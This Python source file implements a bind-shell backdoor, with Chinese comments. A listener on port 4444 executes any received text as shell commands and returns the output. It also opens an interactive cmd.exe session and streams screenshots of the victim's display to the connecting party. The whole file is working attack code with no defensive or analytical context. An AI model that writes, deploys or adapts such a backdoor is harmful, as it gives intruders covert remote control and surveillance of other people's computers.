import socket
import subprocess
import threading
import pyautogui
import os
from PIL import Image

def backdoor():
    HOST = '0.0.0.0'  # 监听所有接口
    PORT = 4444

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(5)
    print(f"[*] 监听 {HOST}:{PORT} 等待连接...")

    def handle_client(conn):
        shell_process = None
        try:
            while True:
                data = conn.recv(1024).decode().strip()
                if not data:
                    break

                # 处理截图命令
                if data == 'screenshot':
                    try:
                        temp_file = "screenshot.png"
                        pyautogui.screenshot(temp_file)
                        conn.send(b"START_FILE_TRANSFER")
                        with open(temp_file, 'rb') as f:
                            while True:
                                file_data = f.read(1024)
                                if not file_data:
                                    break
                                conn.sendall(file_data)
                        conn.send(b"EOF")
                        os.remove(temp_file)
                    except Exception as e:
                        conn.send(f"截图失败: {str(e)}".encode())

                # 启动交互式Shell
                elif data == 'start_shell':
                    if shell_process:
                        shell_process.terminate()
                    shell_process = subprocess.Popen(
                        ['cmd.exe'],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                        shell=True
                    )
                    conn.send(b"Interactive shell started. Type 'exit_shell' to quit.\n")

                # 退出Shell
                elif data == 'exit_shell':
                    if shell_process:
                        shell_process.terminate()
                        shell_process = None
                        conn.send(b"Interactive shell closed.\n")
                    else:
                        conn.send(b"No active shell session.\n")

                # 执行Shell命令
                elif shell_process and shell_process.poll() is None:
                    shell_process.stdin.write(data + '\n')
                    shell_process.stdin.flush()
                    output = shell_process.stdout.read(1024)
                    conn.sendall(output.encode())

                # 执行普通命令
                else:
                    try:
                        result = subprocess.check_output(
                            data, 
                            shell=True, 
                            stderr=subprocess.STDOUT,
                            text=True
                        )
                        conn.send(result.encode())
                    except Exception as e:
                        conn.send(str(e).encode())

        except Exception as e:
            print(f"连接异常: {e}")
        finally:
            conn.close()

    while True:
        conn, addr = s.accept()
        print(f"[+] 收到来自 {addr} 的连接")
        client_thread = threading.Thread(target=handle_client, args=(conn,))
        client_thread.start()

if __name__ == "__main__":
    backdoor()